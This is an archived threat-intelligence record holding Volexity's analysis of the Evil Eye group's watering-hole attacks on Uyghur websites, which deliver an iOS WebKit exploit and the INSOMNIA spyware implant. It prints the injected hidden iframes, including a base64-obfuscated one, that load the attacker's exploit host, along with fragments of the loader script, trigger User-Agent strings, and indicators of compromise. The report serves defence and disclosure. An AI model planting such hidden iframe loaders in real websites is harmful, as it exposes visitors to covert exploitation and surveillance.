{
    "id": "ba6f038a-f70e-454d-a75b-d57999fdb19f",
    "created_at": "2022-10-25T16:48:21.207303Z",
    "updated_at": "2025-03-27T02:15:10.651539Z",
    "deleted_at": null,
    "sha1_hash": "1df98e647d64ef01bdc29e2530e611effe5e895b",
    "title": "",
    "authors": "",
    "file_creation_date": "2020-04-22T06:27:23Z",
    "file_modification_date": "2020-04-22T06:27:23Z",
    "file_size": 941135,
    "plain_text": "# Evil Eye Threat Actor Resurfaces with iOS Exploit and Updated Implant\n\n**[volexity.com/blog/2020/04/21/evil-eye-threat-actor-resurfaces-with-ios-exploit-and-updated-implant](https://www.volexity.com/blog/2020/04/21/evil-eye-threat-actor-resurfaces-with-ios-exploit-and-updated-implant/)**\n\nApril 21, 2020\n\nby Andrew Case, Dave Lassalle, Matthew Meltzer, Sean Koessel, Steven Adair, Thomas Lancaster\n\n[In September 2019, Volexity published Digital Crackdown: Large-Scale Surveillance and Exploitation of Uyghurs, which described a series of attacks against](https://www.volexity.com/blog/2019/09/02/digital-crackdown-large-scale-surveillance-and-exploitation-of-uyghurs/)\nUyghurs from multiple Chinese APT actors. The most notable threat actor detailed in the blog was one Volexity calls Evil Eye. The Evil Eye threat actor was\nobserved launching an exploit aimed at installing a malware implant on Android phones. Volexity also believed this was likely the same group responsible for\n[the launching exploits aimed at installing an iOS implant as described by Google’s Project Zero. Immediately after the publications from Google and Volexity,](https://googleprojectzero.blogspot.com/2019/08/a-very-deep-dive-into-ios-exploit.html)\nthe Evil Eye threat actor went fairly quiet. They removed their malicious code from compromised websites, command and control (C2) servers were taken\ndown, and various hostnames stopped resolving. This largely remained the case until early January 2020, when Volexity observed a series of new activity\nacross multiple previously compromised Uyghur websites.\n\n[In the latest activity identified by Volexity, the Evil Eye threat actor used an open source framework called IRONSQUIRREL to launch their exploit chain. The](https://github.com/MRGEffitas/Ironsquirrel)\nexploits used targeted Apple iOS operating systems leveraging a vulnerability in WebKit that appears to have been patched in the summer of 2019. The exploit\nworks against iOS versions 12.3, 12.3.1, and 12.3.2. These versions of iOS are newer than anything mentioned in the Google Project Zero blog, or any other\nrecently published reports involving weaponized exploits that can be used remotely against iPhones or iPads. If the exploit is successful, a new version of the\nimplant described by Google will be installed onto the device. Volexity refers to this implant by the name INSOMNIA.\n\nVolexity observed multiple different attacks where this implant was being installed on iOS devices. This includes six different exploit websites; five instances of\nthe malware implant; three different C2 IP and port pair combination; and two unique C2 IP addresses. Each of the observed exploit sites and malware C2\nservers are detailed in Appendix A below.\n\n## Targeting Website Visitors\n\nThe Evil Eye actor set up IRONSQUIRREL code to be loaded in a variety of different ways through malicious iframes across the various compromised\nwebsites. Volexity observed a total of six different hostnames being used to launch attacks between January and March 2020.\n\nWhile the first round of attacks were identified across several websites, future attacks were only observed in conjunction with the Uyghur Academy website.\nThe attacks were largely loaded in fairly standard ways, such as via an iframe on a website’s index, a modified JavaScript file used by the website, or nested\niframes—which was the case on the Uyghur Academy website. The code below has been on the main index of the Uyghur Academy website for several\nmonths. The “JPlayer.html” file appears to be exclusively used by the Evil Eye actor when they want to launch attacks against visitors to the website.\nOtherwise, the file is either deleted or emptied out when not in use.\n\n#### <iframe src=”https://akademiye[.]org/ug/wp-content/themes/goodnews/js/Jplayer.html” width=”0ʺ height=”0ʺ></iframe>\n\nIn the first observed example of this iOS exploit actvity, the following code was observed inside Jplayer.html.\n\n#### <iframe src=”https://cdn.doublesclick[.]me/index.html” width=0 height=0></iframe>\n\nThe most notable method of loading the code was via an iframe that was observed on the Chinese-language version of the Uighur Times website. The\nfollowing code was observed.\n\n\n-----\n\n#### <divstyle=”display: none”>\n\n <iframe src=”data:text/html;base64,PGh0bWw+PGhlYWQ+PGJvZHk+PGlmcmFtZSBzcmM9Imh0dHBzOi8vY2RuLmRvdWJsZXNjbGljay5tZS9pbmRleC5odG1sIj48L2lmcm </iframe>\n\n </div>\n\nHere, the entire iframe has been obfuscated by using base64 encoding, which is a common method to embed images in the source of websites. However, it is\nfar less common to see an iframe load content from a remote website; this may be used as an indicator of suspect activity. The base64 content in this iframe\ndecodes as follows:\n\n#### <html><head><body><iframe src=”https://cdn.doublesclick[.]me/index.html”></iframe></body></head></html>\n\n## Targeting Website Visitors\n\nThe index.html file hosted on cdn.doublesclick[.]me would kick off the first step in potential targeting against the user. The response returned by the server\nwould depend on the User-Agent of the visitor making the request. An exploit chain would be kicked off if the right User-Agent string was detected; otherwise,\nthe server would simply respond with the text “ok”.\n\nAs an example, the following User-Agent strings would result in the exploit chain being launched.\n\n#### Mozilla/5.0 (iPhone; CPU iPhone OS 12_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.1.1 EdgiOS/44.5.0.10 Mobile/15E148 Safari/604.1\n\n Mozilla/5.0 (iPad; 12_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0 EdgiOS/44.5.2 Mobile/15E148 Safari/605.1.15CPU OS 1\n\nNote that exploit can be triggered through any browser on the phone, as they all use WebKit. Volexity was able to confirm successful explotiation of a phone\nrunning 12.3.1 via the Apple Safari, Google Chrome, and Microsoft Edge mobile browsers. If a visiting device passes the first checks put in place by Evil Eye,\ncode similar to the following would be returned:\n\n#### <html xmlns=”http://www.w3.org/1999/xhtml”> <head>\n <meta content=”text/html;charset=utf-8ʺ http-equiv=”Content-Type”>\n <meta content=”utf-8ʺ http-equiv=”encoding”>\n\n <title>data list</title>\n\n </head>\n\n <body onload=”myfunction()”>\n\n <script>\n\n function myfunction(){\n\n settings();\n save_data(); }\n </script>\n <script type=”text/javascript” src=”js/s.js?rid=V3KUMVZACLINY324HKVW7CI2EXF3ALPBONLGL23ZP3IKMZ6DVOBA”></script> <script type=”text/javascript” src=”js/jquery.js?rid=V3KUMVZACLINY324HKVW7CI2EXF3ALPBONLGL23ZP3IKMZ6DVOBA”></script>\n </body>\n\n </html>\n\nThe file jquery.js contains the main logic and the server’s public key, while the file s.js contains the supporting Stanford JavaScript Crypto Library used to\ngenerate a client key pair. This client public key is passed as a variable into the loading of the final JavaScript.\n\n#### function goto_application(client_pub_g) {\n document.write(‘\\x3Cscript type=”text/javascript” src=”application?\n rid=VGXBJK2MFSGLRKQS7PZVJ2L5ZP3XTZPTDSFFYZYBFQPZBTBFKRJQ&cl=’+ encodeURIComponent(client_pub_g)+ ‘”>\\x3C/script>’); }\n\nThe JavaScript served by the “application” request contains the following key functions/variables:\n\n#### Function or variable Purpose\n\n var load_macho Contains the malicious app to be dropped\n\n\n#### function version_is_supported()\n\n\n#### Checks if version of iOS (based on User-Agent) is suitable for exploit (return “12_3_2” == r || “12_3_1” == r || “12_3” == r)\n\n\n#### function exp() Responsible for running the exploit, similar to this code\n\n\n-----\n\n#### function stage_stable() Prepares a fake object for the exploit, in a similar way to this\n\n function stage_final() Responsible for building the Mach-O from the hex array & prepares the memory space to drop it in\n\nIf each step of the JavaScript above is successful, it results in a Mach-O binary running on the phone. This application contains an iOS exploit for the targeted\nversion and another Mach-O binary, the INSOMNIA implant, embedded in it.\n\nSuccessful iOS exploitation results in the INSOMNIA implant being written to the device at /tmp/updateserver. The implant is then started with the “run”\ncommand-line argument. It runs as root with various entitlements, giving it access to all the data the Evil Eye actor wishes to collect.\n\nVolexity has conducted an initial analysis of the payload delivered through the exploit chain and has been able to confirm successful exploitation of an iPhone\nrunning iOS 12.3.1. An overview of this entire chain is shown in the Figure below:\n\n## INSOMNIA Implant Analysis\n\nFurther analysis of the malicious binary indicates it appears to be an updated version of the implant described by Google’s Project Zero in their Implant\n[Teardown post, which was an updated version of what CitizenLab later described here. The differences and updates are summarized as follows:](https://citizenlab.ca/2019/09/poison-carp-tibetan-groups-targeted-with-1-click-mobile-exploits/)\n\nNew hard-coded IP addresses and ports were found in the malware implants.\nAll C2 communication is now done securely over HTTPS. This encrypts all C2 activity, to include data exfiltration.\nThe malware conducts C2 server validation using a certificate embedded in the malware and will not function if validation fails.\nThe malware employs basic obfuscation techniques to obscure some of its embedded strings.\nThe encrypted messaging and secure e-mail applications Signal and Protonmail have been added to the list of apps that are specifically targeted by the\nmalware.\nIn addition to exfiltrating information about the phone and targeted apps, the malware now automatically sends information about each additional app\nthat is installed on the device during its initial phone-home.\n\nNote that Volexity does not have copies of the exact files analyzed by Project Zero or CitizenLab, so the differences listed above are based on the published\nreports.\n\n### Obfuscated Strings\n\nThe implant made extensive use of obfuscated strings to hide file names, API names, URL parameters, and other data relevant to its operations. These strings\nwere obfuscated by a routine that used a string-specific XOR key and length. The following screenshot shows the decompilation of this routine inside of\n[Ghidra.](https://ghidra-sre.org/)\n\n\n-----\n\nStepping through this code, the routine takes a pointer to an encrypted string’s data structure as an argument.\n\nOn line 7, it first checks if the string has already been decrypted (offset 0x14).\nIf it has not, then it checks that the length is greater than 0 on line 8 (offset 0x10).\nIt then loops for each character in the obfuscated string and deobfuscates with XOR. The pointer to the string is stored at offset 8, and the one byte XOR\nkey to use is stored at offset 0 of the data structure. To aid in our analysis, we developed a script that brute-force decrypted every string in the binary in\none pass.\n\n### Malware Communication\n\nOne of the main criticisms Project Zero made of the attackers was the lack of encryption used by the malware during their operations:\n\n#### There’s something thus far which is conspicuous only by its absence: is any of this encrypted? The short answer is no: they really do POST everything via\n\n HTTP (not HTTPS) and there is no asymmetric (or even symmetric) encryption applied to the data which is uploaded.\n\nThe attackers appear to have addressed this and added HTTPS communication capabilities to their malware. To allow the malicious application to use a selfsigned certificate, the malware developers embedded the webserver’s public x509 certificate inside of the executable. This certificate is hardcoded in the\n[_mach_h section of the __DATA segment. The malware uses the getsectiondata API in order to retrieve the certificate at runtime.](http://www.dpldocs.info/experimental-docs/core.sys.darwin.mach.getsect.getsectiondata.html)\n\n[The embedded certificate is stored in the DER (binary) format; at runtime, the certificate is passed to the SecCertificateCreateWithData API inside of the](https://developer.apple.com/documentation/security/1396073-seccertificatecreatewithdata)\n[malware’s didReceiveAuthenticationChallenge handler. As documented nicely in a developer’s blog post and by Apple, this process allows for applications to](https://developer.apple.com/documentation/foundation/nsurlsessiontaskdelegate/1411595-urlsession)\noverride the system’s built-in handling of certificates, and to provide their own authentication for the application’s self-signed certificates. This is actually the\nway Apple recommends to use self-signed certificates during development, and the malware is abusing it for its own purposes. Appendix C contains the\nhuman-readable form of the certificate embedded in our analyzed binary.\n\nThe use of a specific certificate and SSL verification means that the malware will not talk to just any listening HTTPS server, which adds complexity to\nanalyzing INSOMNIA in a sandbox environment. To allow the malware to communicate with Volexity’s custom server implementation, it was necessary to\n“trick” the malware into trusting the server we had set up to act as the C2. Since Volexity did not have access to the private key of the certificate originally\nembedded in the malware, another solution had to be identified. The chosen solution was to edit the malware directly and to replace the embedded certificate\nwith one that we created. This was done by overwriting the certificate in the binary and updating the mach_h section size header to match the length of the\nnew certificate. Once safely replaced, the malware trusted the sandbox server and began communication.\n\nWith the malware successfully communicating with the Volexity C2 server, we were able to inspect the data stolen from our dummy device. As per previous\nwrite-ups of this malware, the data transferred is not encrypted (except for the HTTPS), so we can easily look at the data stolen. Since this has already been\ndone in depth in the Project Zero write-up, we will not go over it again here, with the exception of the stolen Signal data. The data stolen from the Signal app is\nas follows:\n\nImages transferred using Signal (these are unencrypted on the phone)\nA copy of the messages stored in an SQLite3 database (these are encrypted on the phone)\n\n\n-----\n\nThe messages require a key from the phones keychain in order to be successfully decrypted. In the Volexity test environment, the required key was not\nautomatically exfiltrated, perhaps showing a shortcoming in the attackers’ thinking.\n\nOver time, the IP addresses the malware was configured to communicate with, ports, and certificates used to verify the server were modified.\n\n### Functionality & Targeted Applications\n\nAs described in the Project Zero and CitizenLab posts, the malware contains a list of applications for which it will steal data automatically if they are installed.\nSince the last analysis, the following applications have been added to this list:\n\nSignal (org.whispersystems.signal)\nProtonMail (ch.protonmail.protonmail)\n\nThe inclusion of these apps suggests they are being more commonly used by the Uyghur community than before. In particular, the inclusion of Signal and\nProtonMail may suggest that the Uyghurs are aware of potential monitoring of their communications and are attempting to use applications with strong security\nfeatures to avoid this. It is also worth noting that this implant also targets the popular messaging app WeChat. This app is referenced as “com.tencent.xin” in\nother write-ups, but it is not mentioned as WeChat.\n\nVolexity also noted that the malware has no mechanism for persistence. This indicates that the attackers must work quickly to obtain data that they want from a\ndevice before it reboots, or that they may potentially rely on the ability to reinfect a phone. Alternatively, it may be possible the attackers have a method to\nmaintain persistence but only set this up manually after verifying the target.\n\n## Conclusion\n\nEven though the vulnerabilities exploited in this report are patched as of July 2019 with iOS version 12.4 and newer, it appears that Evil Eye is likely having\nsuccess with these attacks. According to Apple’s own statistics from its website:\n\n43% of iPad devices using the App store use iOS 12 or earlier\n30% of iPhone devices using the App store use iOS 12 or earlier\n\nThis represents a considerable attack surface of potentially vulnerable devices.\n\nAs noted in September 2019, Volexity suspected that the Evil Eye attackers had also targeted iPhones based on the attackers’ C2 servers going offline shortly\nafter Project Zero’s findings were made public. These more recent findings confirm the suspicion that the attackers were indeed likely the same. It can now be\nconfirmed that in the past six months, Uyghur sites have led to malware for all major platforms, representing a considerable development and upkeep effort\nby the attackers to spy on the Uyghur population.\n\n## Appendix A – Network Indicators\n\n#### IOC Type Value Description\n\n IP Address 154.85.32.52 C2 for iOS implant observed on TCP ports 43223 and 43773\n\n IP Address 154.85.37.250 C2 for iOS implant observed on TCP port 43111\n\n Hostname static.doublesclick.info IRONSQUIRREL exploit hostname\n\n Hostname cdn.doublesclick.me IRONSQUIRREL exploit hostname\n\n Hostname api.doubles.click IRONSQUIRREL exploit hostname\n\n Hostname status.search-sslkey-flush.com IRONSQUIRREL exploit hostname\n\n Hostname start.apiforssl.com IRONSQUIRREL exploit hostname\n\n Hostname status.verifyingbycf.com IRONSQUIRREL exploit hostname\n\n IP Address 154.85.33.48 Resolution for malicious hostname\n\n IP Address 154.85.34.49 Resolution for malicious hostname\n\n IP Address 154.85.34.214 Resolution for malicious hostname\n\n IP Address 154.85.34.19 Resolution for malicious hostname\n\n Hostname 154.85.35.1 Resolution for malicious hostname\n\n## Appendix B – INSOMNIA Implant Hashes\n\n#### SHA256 Description\n\n c9320a9dc97adbe96c088d3f5ddf3f9275124137f0bf200fdd7160f47c5dcf1a Executed as /tmp/updateserver with C2 at 154.85.32.52:43223\n\n a8dd8caaeb43d693ececf096bc6fe6c7cbf1ce513cfe33de4224c5c30661a4e3 Executed as /tmp/updateserver with C2 154.85.32.52:43773\n\n\n-----\n\n#### 20827a607bacca9119b6‐ fa471b37d6c751664900e68e50e28b734353c36f0d0c\n\n\n#### Executed as /tmp/updateserver with C2 154.85.37.250:43111\n\n\n#### c8961483c7197aa0f352b2fd007412e88723fd5af4f64788aa1ce48a0999bd38 Executed as /tmp/updateserver with C2 154.85.32.52:43773\n\n 9518c66b9b568c0f00f9540b961a40529e38c0d723bd800a9c33a043e6b746f6 Executed as /tmp/updateserver with C2 154.85.32.52:43773\n\n## Appendix C – Embedded Certificate\n\n#### Serial Number: 1111444412586956902 (0xf6ca4cdf7d69866) Signature Algorithm: sha256WithRSAEncryption\n\n Issuer: C=US, O=xLq, OU=www.xzXW.com, CN=XdM Root CA Validity Not Before: Dec 24 22:03:30 2019 GMT\n\n Not After : Dec 24 22:03:30 2039 GMT Subject: C=US, O=xLq, OU=www.xzXW.com, CN=XdM Root CA\n\n Serial Number: 2330826125403043443 (0x2058c20305d93673) Signature Algorithm: sha256WithRSAEncryption Issuer: C=US, O=SsT, OU=www.p83.com, CN=3fbW Root CA\n\n Validity Not Before: Jan 20 17:02:26 2020 GMT\n\n Not After : Jan 20 17:02:26 2040 GMT Subject: C=US, O=SsT, OU=www.p83.com, CN=3fbW Root CA\n\n Serial Number: 1152440617419100323 (0xffe4aa2b9ff50a3) Signature Algorithm: sha256WithRSAEncryption Issuer: C=US, O=CD6, OU=www.bUjS0F.com, CN=i4v Root CA\n\n Validity Not Before: Feb 2 19:44:45 2020 GMT Not After : Feb 2 19:44:45 2040 GMT\n\n Subject: C=US, O=CD6, OU=www.bUjS0F.com, CN=i4v Root CA\n\n Serial Number: 2340440485700108803 (0x207aea38b8190203)\n\n Signature Algorithm: sha256WithRSAEncryption Issuer: C=US, O=sCO, OU=www.w2j082Q.com, CN=4VNf Root CA\n\n Validity\n\n Not Before: Mar 13 17:29:21 2020 GMT Not After : Mar 13 17:29:21 2040 GMT\n\n Subject: C=US, O=sCO, OU=www.w2j082Q.com, CN=4VNf Root CA\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "5d2b9e7f-cf43-4b54-ba18-065aa3003611",
            "created_at": "2022-10-25T16:06:24.199525Z",
            "updated_at": "2022-10-25T16:06:24.199525Z",
            "deleted_at": null,
            "name": "CyberMonitor",
            "url": "https://github.com/CyberMonitor/APT_CyberCriminal_Campagin_Collections",
            "description": "APT & Cybercriminals Campaign Collection",
            "reports": null
        }
    ],
    "references": [
        "https://github.com/CyberMonitor/APT_CyberCriminal_Campagin_Collections/raw/master/2020/2020.04.21.evil-eye-threat-actor/Evil%20Eye%20Threat%20Actor%20Resurfaces%20with%20iOS%20Exploit%20and%20Updated%20Implant.pdf"
    ],
    "report_names": [
        "Evil Eye Threat Actor Resurfaces with iOS Exploit and Updated Implant"
    ],
    "threat_actors": [
        {
            "id": "f0ebaf6d-5e1a-4ed7-aa2c-0e69a648acea",
            "created_at": "2022-10-25T16:07:23.597455Z",
            "updated_at": "2025-03-27T02:02:09.881507Z",
            "deleted_at": null,
            "main_name": "Evil Eye",
            "aliases": [],
            "source_name": "ETDA:Evil Eye",
            "tools": [],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "d2a5c949-7ae0-4610-8bb8-047ab03b1574",
            "created_at": "2022-10-25T16:07:24.064197Z",
            "updated_at": "2025-03-27T02:02:10.096487Z",
            "deleted_at": null,
            "main_name": "Poison Carp",
            "aliases": [
                "Earth Empusa",
                "Evil Eye",
                "EvilBamboo",
                "Poison Carp",
                "Red Dev 16"
            ],
            "source_name": "ETDA:Poison Carp",
            "tools": [
                "ActionSpy",
                "AxeSpy",
                "BADSIGNAL",
                "BADSOLAR",
                "BadBazaar",
                "IRONSQUIRREL",
                "IceCube",
                "MOONSHINE",
                "PoisonCarp"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "52973e5f-9656-4b60-b7f8-457e32ac4bbe",
            "created_at": "2023-01-06T13:46:39.056888Z",
            "updated_at": "2025-03-27T02:00:02.986693Z",
            "deleted_at": null,
            "main_name": "POISON CARP",
            "aliases": [
                "Evil Eye",
                "Red Dev 16",
                "Earth Empusa"
            ],
            "source_name": "MISPGALAXY:POISON CARP",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        }
    ],
    "ts_created_at": 1666716501,
    "ts_updated_at": 1743041710,
    "ts_creation_date": 1587536843,
    "ts_modification_date": 1587536843,
    "files": {
        "pdf": "https://archive.orkl.eu/1df98e647d64ef01bdc29e2530e611effe5e895b.pdf",
        "text": "https://archive.orkl.eu/1df98e647d64ef01bdc29e2530e611effe5e895b.txt",
        "img": "https://archive.orkl.eu/1df98e647d64ef01bdc29e2530e611effe5e895b.jpg"
    }
}